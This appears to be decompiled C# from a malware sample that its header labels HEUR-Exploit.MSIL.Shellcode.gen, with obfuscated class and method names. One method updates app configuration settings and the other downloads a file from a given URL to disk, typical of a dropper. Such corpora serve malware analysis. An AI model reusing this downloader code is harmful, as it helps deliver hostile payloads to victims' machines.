// Decompiled with JetBrains decompiler
// Type: 129117523387.295396826917
// Assembly: 582573968022, Version=15.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
// MVID: 22949299-4A50-46F6-851E-C2A296093D37
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Exploit.MSIL.Shellcode.gen-35a63266858befa3a9a9f8f0684d53a6905ab1fbfd8df949e6989c20107cc290.exe

using \u003736038739114;
using System;
using System.Configuration;
using System.IO;
using System.Net;

namespace \u003129117523387
{
  public static class \u003295396826917
  {
    public static void \u003440173703347(string _param0, string _param1)
    {
      if (string.IsNullOrWhiteSpace(_param0))
        throw new ArgumentNullException("key");
      System.Configuration.Configuration configuration = ConfigurationManager.OpenExeConfiguration(ConfigurationUserLevel.None);
      configuration.AppSettings.Settings[_param0].Value = _param1;
      configuration.Save(ConfigurationSaveMode.Modified);
      ConfigurationManager.RefreshSection("appSettings");
    }

    public static void \u003758564738020(string _param0, string _param1)
    {
      if (string.IsNullOrWhiteSpace(_param0))
        return;
      HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(_param0);
      httpWebRequest.UserAgent = \u003674730614811.\u003669097761689;
      httpWebRequest.AllowAutoRedirect = true;
      httpWebRequest.KeepAlive = false;
      int totalMilliseconds = (int) TimeSpan.FromMinutes(10.0).TotalMilliseconds;
      httpWebRequest.Timeout = totalMilliseconds;
      httpWebRequest.ReadWriteTimeout = totalMilliseconds;
      using (HttpWebResponse response = (HttpWebResponse) httpWebRequest.GetResponse())
      {
        using (Stream responseStream = response.GetResponseStream())
        {
          if (responseStream == null)
            return;
          using (FileStream fileStream = new FileStream(_param1, FileMode.Create, FileAccess.Write, FileShare.None))
          {
            byte[] buffer = new byte[8192];
            int length = buffer.Length;
            int count;
            while ((count = responseStream.Read(buffer, 0, length)) > 0)
            {
              fileStream.Write(buffer, 0, count);
              fileStream.Flush();
            }
          }
        }
      }
    }
  }
}
